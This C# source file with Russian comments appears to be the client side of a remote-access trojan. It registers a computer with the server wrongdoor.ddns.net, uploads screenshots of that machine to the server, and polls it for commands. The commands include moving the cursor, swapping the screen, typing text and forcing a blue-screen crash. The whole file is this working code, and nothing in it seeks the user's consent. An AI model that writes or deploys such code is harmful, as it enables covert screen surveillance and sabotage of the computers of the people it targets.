using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Text;
using System.Threading.Tasks;


namespace API
{
    public class Room
    {
        string computername;
        public List<Command> commands = new List<Command> { };

        /// <summary>
        /// Возвращает онлайн ли комната
        /// </summary>
        public bool isOnline
        {
            get
            {
                WebClient webClient = new WebClient();
                webClient.QueryString.Add("computername", computername);
                string result = webClient.DownloadString("http://wrongdoor.ddns.net/rooms/isOnline.php");
                Console.WriteLine(result);
                Status status = JsonConvert.DeserializeObject<Status>(result);
                commands = (status.commands != null) ? status.commands : new List<Command> { }; ;
                return (status.isOnline);
            }
        }

        public Room(string computername)
        {
            this.computername = computername;
            init(computername);
        }


        /// <summary>
        /// Отсылает скриншот на сервер
        /// </summary>
        /// <param name="screenshot"></param>
        /// <returns></returns>
        public async Task sendScreen(MemoryStream ms)
        {
            HttpClient client = new HttpClient();
            client.BaseAddress = new Uri("http://wrongdoor.ddns.net/");
            MultipartFormDataContent form = new MultipartFormDataContent();
            form.Add(new StringContent(computername), "computername");
            form.Add(new ByteArrayContent(ms.GetBuffer(),0, ms.GetBuffer().Length), "screenshot", "screenshot.jpg");
            await client.PostAsync("http://wrongdoor.ddns.net/rooms/sendScreen.php", form);


            /*HttpClient client = new HttpClient();
            Dictionary<string, string> postdata = new Dictionary<string, string>
            {
                { "screenshot", screenshot },
                { "computername", computername },
            };
            var stringPayload = JsonConvert.SerializeObject(postdata);
            var content = new StringContent(stringPayload, Encoding.UTF8, "application/json");
            await client.PostAsync("http://wrongdoor.ddns.net/rooms/sendScreen.php", content);*/
        }



        /// <summary>
        /// Создаёт новую комнату
        /// </summary>
        /// <param name="computername">имя компутера</param>
        private static void init(string computername)
        {
            WebClient webClient = new WebClient();
            webClient.QueryString.Add("computername", computername);
            string result = webClient.DownloadString("http://wrongdoor.ddns.net/rooms/init.php");
        }
    }


    /// <summary>
    /// return from server
    /// </summary>
    class Status
    {
        public List<Command> commands;
        public bool isOnline;
    }


    /// <summary>
    /// Команда, НЕ БЕРИ ПЕРЕМЕННЫЕ, ели ты не уверен, что они присутсвуют в статусе
    /// </summary>
    public interface Command
    {
        CommandTypes type { get; }
        int x { get; }
        int y { get; }
        string text { get; }
    }

    /// <summary>
    /// Типы команд(если хочешь добавить свою, то тебе нада обговаривать со мной) 
    /// </summary>
    public enum CommandTypes
    {
        AntiVanya = 0,
        Cursor = 1,
        SwapScreen = 2,
        WriteText = 3,
        BSOD = 4,
    }
}

